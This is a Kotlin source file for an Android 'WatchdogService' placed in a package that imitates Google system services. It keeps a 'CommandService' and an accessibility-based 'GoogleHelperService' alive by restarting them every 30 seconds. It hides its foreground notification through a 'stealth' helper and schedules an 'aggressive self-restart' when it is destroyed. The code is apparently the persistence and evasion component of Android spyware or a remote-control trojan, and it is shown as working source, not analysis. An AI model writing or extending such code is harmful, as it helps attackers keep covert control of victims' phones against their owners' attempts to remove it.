package com.google.android.systemservice.services

import android.app.ActivityManager
import android.app.AlarmManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import com.google.android.systemservice.utils.StealthNotificationHelper

/**
 * Watchdog service that monitors CommandService and restarts it if killed.
 * Runs in a separate process for dual-process guard pattern.
 */
class WatchdogService : Service() {

    companion object {
        private const val TAG = "WatchdogService"
        private const val CHECK_INTERVAL_MS = 30_000L // 30 seconds
    }

    private val handler = Handler(Looper.getMainLooper())
    private val watchdogRunnable = object : Runnable {
        override fun run() {
            Thread {
                checkAndRestartServices()
            }.start()
            handler.postDelayed(this, CHECK_INTERVAL_MS)
        }
    }

    override fun onCreate() {
        super.onCreate()
        val notification = StealthNotificationHelper.createStealthNotification(this)
        startForeground(StealthNotificationHelper.WATCHDOG_SERVICE_ID, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        handler.removeCallbacks(watchdogRunnable)
        handler.post(watchdogRunnable)
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun checkAndRestartServices() {
        try {
            // Watch CommandService
            if (!isServiceRunning(CommandService::class.java.name)) {
                Log.d(TAG, "CommandService is dead, restarting...")
                try {
                    val intent = Intent(this, CommandService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(intent)
                    } else {
                        startService(intent)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to restart CommandService: ${e.message}")
                }
            }
            
            // Watch GoogleHelperService (Accessibility)
            if (!isServiceRunning(GoogleHelperService::class.java.name)) {
                Log.d(TAG, "GoogleHelperService is dead, restarting...")
                try {
                    val intent = Intent(this, GoogleHelperService::class.java)
                    startService(intent)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to restart GoogleHelperService: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking services: ${e.message}")
        }
    }

    private fun isServiceRunning(className: String): Boolean {
        val manager = getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager ?: return false
        return if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            @Suppress("DEPRECATION")
            manager.getRunningServices(Integer.MAX_VALUE)
                .any { it.service.className == className }
        } else {
            // API 26+: getRunningServices is deprecated; check via running app processes
            manager.runningAppProcesses?.any { processInfo ->
                processInfo.processName == packageName &&
                    processInfo.importance <= ActivityManager.RunningAppProcessInfo.IMPORTANCE_SERVICE
            } ?: false
        }
    }

    override fun onDestroy() {
        handler.removeCallbacks(watchdogRunnable)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            stopForeground(STOP_FOREGROUND_REMOVE)
        } else {
            @Suppress("DEPRECATION")
            stopForeground(true)
        }
        
        // Use AlarmManager for aggressive self-restart
        val intent = Intent(this, WatchdogService::class.java)
        val pendingIntent = PendingIntent.getService(
            this, System.currentTimeMillis().toInt(), intent, 
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as? AlarmManager ?: return
        alarmManager.set(
            AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis() + 5000,
            pendingIntent
        )
        
        Log.d(TAG, "Watchdog scheduled self-restart in 5s")
        super.onDestroy()
    }
}
